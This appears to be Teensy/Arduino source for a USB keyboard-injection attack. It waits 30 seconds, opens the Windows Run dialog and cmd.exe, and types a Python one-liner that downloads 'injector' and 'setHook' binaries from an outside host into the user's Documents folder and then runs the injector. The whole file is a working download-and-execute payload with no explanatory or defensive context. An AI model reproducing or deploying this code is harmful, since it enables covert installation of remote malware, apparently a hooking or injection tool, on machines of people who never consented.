void setup()
{
   delay(30000);
   openCmd();
   delay(1000);
   execCmd();
   delay(1000);
   exitCmd();
}

void resetKey()
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();  
}

void openCmd()
{
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    resetKey();
    delay(1000);
    Keyboard.println("cmd.exe");
}

void exitCmd()
{
   Keyboard.println("exit");
}

void execCmd()
{
    Keyboard.println("C:\\Python26\\python.exe -c \"import urllib;import getpass;import os;path=\\\"C:\\\\Users\\\\\\\\\\\"+getpass.getuser()+\\\"\\\\Documents\\\\\\\\\\\";urllib.URLopener().retrieve(\\\"http://epiteensy.comli.com/injector.dll\\\",path+\\\"injector.exe\\\");urllib.URLopener().retrieve(\\\"http://epiteensy.comli.com/setHook.dll\\\",path+\\\"setHook.dll\\\");os.system(path+\\\"injector.exe\\\")\"");
}

void loop()
{
}

